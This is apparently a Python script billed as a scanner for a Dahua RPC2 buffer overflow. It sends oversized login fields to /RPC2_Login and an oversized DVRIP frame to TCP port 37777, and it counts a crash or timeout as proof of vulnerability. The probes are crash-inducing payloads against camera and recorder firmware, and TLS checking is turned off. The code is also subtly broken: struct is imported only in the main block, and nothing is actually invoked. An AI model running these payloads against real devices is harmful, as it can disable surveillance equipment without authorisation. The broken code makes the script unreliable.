#!/usr/bin/env python3
"""CVE-2025-31700/31701: Dahua RPC2 Buffer Overflow Scanner
CVSS: 8.1 HIGH | HTTP /RPC2_Login + TCP/37777"""
import json, socket, urllib.request, ssl
from pathlib import Path

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def probe(host, port=80):
    """Send oversized JSON to /RPC2_Login to trigger buffer overflow."""
    garbage = "A" * 8192
    payload = {"method": "global.login", "params": {"userName": garbage, "password": garbage,
                "clientType": garbage, "authorityType": "Default", "passwordType": "Default"}, "id": 1}
    try:
        url = f"http://{host}:{port}/RPC2_Login"
        resp = urllib.request.urlopen(urllib.request.Request(url, data=json.dumps(payload).encode(),
            headers={'Content-Type': 'application/json'}, method='POST'), timeout=10, context=ctx)
        return False
    except urllib.error.HTTPError as e:
        return e.code >= 500
    except (ConnectionResetError, socket.timeout): return True
    except Exception: return False

def probe_tcp(host, tcp_port=37777):
    """Send oversized DVRIP frame to TCP/37777."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(8)
        s.connect((host, tcp_port))
        body = b"B" * 65535
        header = struct.pack(">I", 0xFF010000) + struct.pack(">I", len(body))
        s.sendall(header + body)
        try: s.recv(1024)
        except socket.timeout: return True
        s.close()
    except Exception: pass
    return False

if __name__ == '__main__': import struct
